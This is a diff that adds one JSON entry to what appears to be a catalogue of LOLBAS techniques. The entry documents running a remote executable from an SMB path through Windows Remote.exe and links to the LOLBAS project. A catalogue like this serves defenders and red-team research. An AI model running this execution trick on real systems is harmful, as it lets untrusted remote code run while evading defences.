@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-remote-exe-execute-2",
+  "name": "LOLBAS · Remote.exe (Execute) #2",
+  "command": "Remote.exe /s {PATH_SMB:.exe} anythinghere",
+  "description": "Run a remote file",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "remote",
+    "execute"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Remote/",
+  "upstream_id": "Remote.exe/Execute/1",
+  "category": "lolbas",
+  "subcategory": "execute",
+  "references": [
+    {
+      "title": "LOLBAS — Remote.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Remote/"
+    }
+  ]
+}
